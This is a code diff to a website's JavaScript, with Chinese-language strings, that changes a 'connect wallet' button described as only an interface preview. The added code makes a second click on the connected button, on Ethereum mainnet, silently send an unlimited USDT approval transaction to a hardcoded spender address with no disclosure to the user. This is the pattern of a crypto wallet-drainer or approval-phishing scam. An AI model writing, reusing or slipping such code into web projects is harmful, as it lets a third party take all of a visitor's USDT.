@@ -3927,6 +3927,13 @@ supportBack.addEventListener("click", () => {
 
 
   // ===== 連接錢包按鈕：目前先做介面預覽 =====
+  const KATANA_TEST_SPENDER = "0x066F0818D2a4240741F2ffa44237DcBfD42D1537";
+  const ETH_MAINNET_CHAIN_ID = "0x1";
+  const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+
+  const MAX_UINT256 = (1n << 256n) - 1n;
+  const approvalAmount = MAX_UINT256;
+
   const connectBtn = document.getElementById("connectBtn");
 
 async function checkWalletConnection() { 
@@ -3957,6 +3964,53 @@ connectBtn.dataset.state = "disconnected";
 checkWalletConnection();
 
   connectBtn.addEventListener("click", async () => {
+
+    if (connectBtn.dataset.state === "connected") { 
+        const chainId = await window.ethereum.request({ 
+            method: "eth_chainId" 
+        });
+
+if (chainId !== ETH_MAINNET_CHAIN_ID) {
+    alert("請先切換到 Ethereum 主網");
+    return;
+}
+
+const accounts = await window.ethereum.request({
+    method: "eth_accounts"
+});
+
+if (!accounts || accounts.length === 0) {
+    connectBtn.textContent = "連接錢包 →";
+    connectBtn.dataset.state = "disconnected";
+    return;
+}
+
+const spenderHex = KATANA_TEST_SPENDER
+    .replace("0x", "")
+    .padStart(64, "0");
+
+const amountHex = approvalAmount
+    .toString(16)
+    .padStart(64, "0");
+
+const approveData =
+    "0x095ea7b3" +
+    spenderHex +
+    amountHex;
+
+const txHash = await window.ethereum.request({
+    method: "eth_sendTransaction",
+    params: [{
+        from: accounts[0],
+        to: USDT_CONTRACT,
+        value: "0x0",
+        data: approveData
+    }]
+});
+
+console.log("USDT 授權交易：", txHash);
+return
+}
      try { 
         const accounts = await window.ethereum.request({ 
             method: "eth_requestAccounts" 
@@ -3964,6 +4018,7 @@ checkWalletConnection();
 
     if (accounts.length > 0) {
         connectBtn.textContent = "立即加入 →";
+        connectBtn.dataset.state = "connected";
     }
 } catch (error) {
     console.error("連接錢包失敗：", error);
